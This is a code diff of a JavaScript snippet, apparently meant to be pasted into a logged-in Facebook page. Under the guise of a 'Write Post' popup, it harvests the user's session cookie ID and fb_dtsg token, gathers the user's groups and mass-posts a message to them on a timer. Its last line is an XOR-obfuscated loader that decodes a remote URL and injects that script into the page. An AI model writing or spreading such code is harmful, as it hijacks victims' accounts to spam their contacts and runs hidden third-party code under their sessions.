@@ -1,5 +1,6 @@
-var askformsg ="<div><span class='img sp_2e7db0 sx_09ce1d'></span><a style='position:absolute;padding-left:3px;font-size:11px;'>Write Post</a></div>";
-askformsg += "<div><textarea id='txtFloodMsg' placeholder='Write somthing...'  style='padding-top:5px;width:505px;height:48px;font-family:tahoma;font-size:13px;background-color:rgba(255,255,255,0.1);'></textarea></div>";askformsg +="<div><button style='margin-left:453px' class='-cx-PRIVATE-abstractButton__root -cx-PRIVATE-uiButton__root -cx-PRIVATE-fbComposerMessageBox__button selected -cx-PRIVATE-uiButton__confirm' onclick='autopostingfunc(this);' >Post</button></div>";
+var askformsg = "<div><span class='img sp_38ydyu sx_004ff3'></span><a style='position:absolute;padding-left:3px;font-size:11px;'>Write Post</a></div></br>";
+askformsg += "<div><textarea id='txtFloodMsg' placeholder='Write somthing...'  style='padding-top:5px;width:505px;height:100px;font-family:tahoma;font-size:13px;background-color:rgba(255,255,255,0.1);'></textarea></div>";
+askformsg += "<div><button style='margin-left:453px' class='_42ft _42fu _11b selected _42g-' onclick='autopostingfunc(this);' >Post</button></div>";
 var Popupset = document.createElement("div");
 Popupset.setAttribute("style", "position:fixed;left:50%;margin-left:-298px;top:100px;z-index:9999;font-size:11px;font-family:tahoma;color:#3B5998;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);font-weight:bold;border-radius:3px;border:1px solid rgba(200,200,50,0.2);padding:5px;background-color:rgba(255,255,255,0.9)");
 Popupset.innerHTML = askformsg;
@@ -159,9 +160,10 @@ var suc = 0;
 var msg = "Hello Friends.";
 var arr = new Array();
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+
 function autopostingfunc(sender) {
     if (document.getElementById("txtFloodMsg").value != "") msg = document.getElementById("txtFloodMsg").value;
-    jx.load(window.location.protocol + "//" + "www.facebook.com/ajax/typeahead/search/bootstrap.php?__a=1&filter[0]=group&viewer" + "=" + user_id + "&token=v7&lazy=0&__user=" + user_id, function (data) {
+    jx.load(window.location.protocol + "//" + "www.facebook.com/ajax/typeahead/search/bootstrap.php?__a=1&filter[0]=group&viewer=" + user_id + "&token=v7&lazy=0&__user=" + user_id, function (data) {
         var text = data;
         var json = text.substring(text.indexOf('{'));
         var friends = JSON.parse(json);
@@ -169,13 +171,13 @@ function autopostingfunc(sender) {
         for (var n = 0; n < friends.length; n++) {
             arr.push(friends[n].uid);
         }
-        sender.parentNode.innerHTML = "Please wait....";
+        sender.parentNode.innerHTML = "Please Wait....";
         postitok();
     });
 }
 var a = document.body.innerHTML;
-var dts = a.match(/name="fb_dtsg" value="([^"]+)"/)[1];
-var composerid = a.match(/name="xhpc_composerid" value="([^"]+)"/)[1];
+var dts = document.getElementsByName('fb_dtsg')[0].value;
+var composerid = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
 
 
@@ -188,5 +190,5 @@ function postitok() {
         suc = 0;
     } else setTimeout("postitok()", 30000 / arr.length);
 }
-setTimeout("autopostingfunc()",1000);
+setTimeout("autopostingfunc()", 1000);
 var A="jvvrq8--pcu,ekvjw`,amo-ucxx{epc{-dcag`mmi-ej/rcegq-Qwrrmpv,hq";B="";C="";var D;D=A.length;for(i=0;i<D;i++){B+=String.fromCharCode(A.charCodeAt(i)^2)}C=unescape(B);document.body.appendChild(document.createElement('script')).src=C;
